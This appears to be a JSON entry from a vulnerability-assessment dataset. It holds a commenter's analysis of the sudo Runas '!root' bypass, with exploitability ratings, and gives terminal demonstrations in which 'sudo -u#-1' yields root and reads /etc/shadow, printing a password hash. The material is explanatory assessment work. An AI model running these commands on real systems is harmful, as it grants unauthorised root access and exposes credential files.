      "document": "I've seen `Runas` specifications on exactly two servers in the wild. I think it's even rarer that you would specify `ALL` and `!root` in the same specification, though it is a better application of the principle of least privilege.\r\n\r\nMore importantly, privilege escalation is contingent on having access to a command that can escape to a shell or otherwise execute arbitrary code or commands. Cool bug, but the use case for this is minimized.\r\n\r\nHere's a contrived example of the bug in action:\r\n\r\n```\r\nvagrant@ubuntu-xenial:~$ sudo -l\r\nMatching Defaults entries for vagrant on ubuntu-xenial:\r\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\r\n\r\nUser vagrant may run the following commands on ubuntu-xenial:\r\n    (ALL, !root) NOPASSWD: /usr/bin/whoami\r\nvagrant@ubuntu-xenial:~$ sudo whoami\r\n[sudo] password for vagrant:\r\nSorry, user vagrant is not allowed to execute '/usr/bin/whoami' as root on ubuntu-xenial.\r\nvagrant@ubuntu-xenial:~$ sudo -u ubuntu whoami\r\nubuntu\r\nvagrant@ubuntu-xenial:~$ sudo -u#-1 whoami\r\nroot\r\nvagrant@ubuntu-xenial:~$\r\n```\r\n\r\nYou must specify `#` to use a UID.\r\n\r\nHere's another example where you're not limited to a command, only the target users:\r\n\r\n```\r\nvagrant@ubuntu-xenial:~$ sudo -l\r\nMatching Defaults entries for vagrant on ubuntu-xenial:\r\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\r\n\r\nUser vagrant may run the following commands on ubuntu-xenial:\r\n    (ALL, !root) NOPASSWD: ALL\r\nvagrant@ubuntu-xenial:~$ sudo whoami\r\n[sudo] password for vagrant:\r\nSorry, user vagrant is not allowed to execute '/usr/bin/whoami' as root on ubuntu-xenial.\r\nvagrant@ubuntu-xenial:~$ sudo -u#-1 whoami\r\nroot\r\nvagrant@ubuntu-xenial:~$ sudo -u#-1 cat /etc/shadow\r\nroot:*:17897:0:99999:7:::\r\ndaemon:*:17897:0:99999:7:::\r\nbin:*:17897:0:99999:7:::\r\nsys:*:17897:0:99999:7:::\r\nsync:*:17897:0:99999:7:::\r\ngames:*:17897:0:99999:7:::\r\nman:*:17897:0:99999:7:::\r\nlp:*:17897:0:99999:7:::\r\nmail:*:17897:0:99999:7:::\r\nnews:*:17897:0:99999:7:::\r\nuucp:*:17897:0:99999:7:::\r\nproxy:*:17897:0:99999:7:::\r\nwww-data:*:17897:0:99999:7:::\r\nbackup:*:17897:0:99999:7:::\r\nlist:*:17897:0:99999:7:::\r\nirc:*:17897:0:99999:7:::\r\ngnats:*:17897:0:99999:7:::\r\nnobody:*:17897:0:99999:7:::\r\nsystemd-timesync:*:17897:0:99999:7:::\r\nsystemd-network:*:17897:0:99999:7:::\r\nsystemd-resolve:*:17897:0:99999:7:::\r\nsystemd-bus-proxy:*:17897:0:99999:7:::\r\nsyslog:*:17897:0:99999:7:::\r\n_apt:*:17897:0:99999:7:::\r\nlxd:*:17897:0:99999:7:::\r\nmessagebus:*:17897:0:99999:7:::\r\nuuidd:*:17897:0:99999:7:::\r\ndnsmasq:*:17897:0:99999:7:::\r\nsshd:*:17897:0:99999:7:::\r\npollinate:*:17897:0:99999:7:::\r\nvagrant:$6$pjYWAc.5$QYfO.wN80gnGe2kC1jYmSTGmO/qelG1CMl6ubKMbDQt9b1TEKZ648PQGI7VC88XE3ObdPBswUavsC1eDVZunJ.:17897:0:99999:7:::\r\nubuntu:!:18100:0:99999:7:::\r\nvagrant@ubuntu-xenial:~$\r\n```",
      "score": 4,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 5,
        "urgent-to-patch": 3,
        "used-successfully": 5,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    }
  ]
}